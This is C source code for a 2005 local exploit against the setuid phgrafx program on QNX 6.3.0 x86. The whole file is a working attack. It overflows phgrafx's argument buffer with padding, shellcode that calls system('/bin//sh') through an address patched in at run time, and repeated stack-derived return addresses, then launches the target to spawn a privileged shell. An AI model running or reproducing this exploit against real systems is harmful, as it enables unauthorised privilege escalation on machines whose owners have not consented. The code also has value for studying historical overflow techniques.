/*
 * minervini@neuralnoise.com (c) 2005, all rights reserved.
 * sample exploit for phgrafx on QNX 6.3.0 x86
 *
 * tested on: QNX qnx 6.3.0 2004/04/29-21:23:19UTC x86pc x86
 */

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <err.h>

#ifndef _PATH
# define _PATH ("/usr/photon/bin/phgrafx")
#endif

#ifndef _RET_INIT
# define _RET_INIT (864)
#endif

/* thanks to my friend pi3 that suggested me to call a libc
 * function to make the shellcode way shorter than it was */

char scode[] = "\x31\xc0"       // xor    %eax,%eax
  "\x50"                        // push   %eax
  "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
  "\x54"                        // push   %esp
  "\xbb\xEF\xBE\xAD\xDE"        // mov    $0xDEADBEEF,%ebx
  "\xff\xd3";                   // call   *%ebx

unsigned long get_sp (void) {
   __asm__ ("movl %esp, %eax");
}

int main (int argc, char **argv) {

   int i, slen = strlen (scode), offset = 0;
   long ptr, *lptr, addr;
   char *buf;
   void *handle;

   handle = dlopen (NULL, RTLD_LAZY);
   addr = (long) dlsym (handle, "system");

   for (i = 0; i < 4; i++) {
      char temp = (*((char *) &addr + i) & 0xff);
      if (temp == 0x00 || temp == 0x09 || temp == 0x0a) {
         puts
           ("currently system()'s address contains bytes like 0x00, 0x09 or 0x0a, so it probably won't work since"
            " the application seems to truncate those bytes. BTW you can rely on functions like exec*(), spawn*()"
            " or MsgSend*() to get this working.\n"
            "more at http://www.qnx.org/developers/docs/momentics621_docs/neutrino/lib_ref/");
         return (-1);
      }
   }

   memcpy((char *)&scode + 0xf, &addr, 4);

   if (argc > 1)
     offset = strtoul(argv[1], NULL, 0);

   if (!(buf = (char *) malloc(1032)))
     err(1, "malloc()");

   memset(buf, 0, 1032);

   for (i = 0; i < (_RET_INIT - slen); i++)
     buf[i] = 'A'; // inc %ecx

   printf("shellcode length: %d\n", slen);

   for (i = (_RET_INIT - slen); i < _RET_INIT; i++)
     buf[i] = scode[i - (_RET_INIT - slen)];

   lptr = (long *) (buf + _RET_INIT);

   printf("address: 0x%lx\n", ptr = (get_sp () - offset));

   for (i = 0; i < ((1024 - _RET_INIT) / 4); i++)
     *(lptr + i) = (int) ptr;

   execl(_PATH, "phgrafx", buf, NULL);

   return (0);
}
